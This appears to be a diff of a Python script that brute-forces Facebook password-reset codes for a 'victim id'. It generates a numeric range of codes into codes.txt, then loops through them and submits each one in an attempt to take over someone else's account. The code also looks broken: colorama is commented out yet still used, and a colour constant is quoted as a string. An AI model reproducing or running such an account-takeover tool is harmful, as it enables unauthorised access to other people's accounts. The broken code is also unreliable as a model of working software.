@@ -4,25 +4,9 @@ import sys
 from urllib.request import urlopen
 import requests
 from bs4 import *
-from colorama import Fore, Back, Style 
+#from colorama import Fore, Back, Style 
 import webbrowser
 
-
-print('''
-    ============ Menu ==============
-    1- Reset Code Facebook 
-    0- To Exit''')
-#genarating code to use it for brute forcing
-first_code = int(input(Back.BLUE+"Insert First Code: "))
-
-last_code = int(input("Insert Last Code: "))
-
-with open ('codes.txt','w') as f:
-	for i in range(first_code,last_code):
-		if len(str(i))<=5:
-			f.write(f'0{str(i)}\n')
-		else:
-			f.write(f'{str(i)}\n')
 
 headers = {
 	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
@@ -59,21 +43,33 @@ def function(passw):
 	else:
 		print('false')
 
-
+print('''
+    ============ Menu ==============
+    1- Reset Code Facebook 
+    0- To Exit''')
+choice=input(Fore.YELLOW+"Enter your choice : ")
+print(Style.RESET_ALL)
 if choice =='1':
-                choice=input(Fore.YELLOW+"Enter your choice : ")
-
-                print(Style.RESET_ALL)
-                target=input(Back.GREEN+'Enter you victim id :> ')
-
-		f= open('codes.txt', 'r',encoding='utf-8')
-		w=f.read()
-		print(Fore.RED+"Facebook code loaded \!/\n")
-		print(Style.RESET_ALL) 
-		l = w.split('\n')
-		for k in l:
-				print(Fore.RED+'trying ..',k)
-				function(k)
+            first_code = int(input(Back.BLUE+"Insert First Code: "
+            ))
+            last_code = int(input("Insert Last Code: "))
+            with open ('codes.txt','w') as f:
+             	 for i in range(first_code,last_code):
+             	 	if len(str(i))<=5:
+             	 		f.write(f'0{str(i)}\n')
+             	 	else:
+             	 		f.write(f'{str(i)}\n')
+             	 
+            target=input('Back.GREEN'+'Enter you victim id :> ')
+            f= open('codes.txt', 'r',encoding='utf-8')
+            w=f.read()
+            print(Fore.RED+"Facebook code loaded \!/\n")
+            print(Style.RESET_ALL) 
+            l = w.split('\n')
+            for k in l:
+             	print(Fore.RED+'trying ..',k)
+             	function(k)
 else:
       exit(0)
     
+
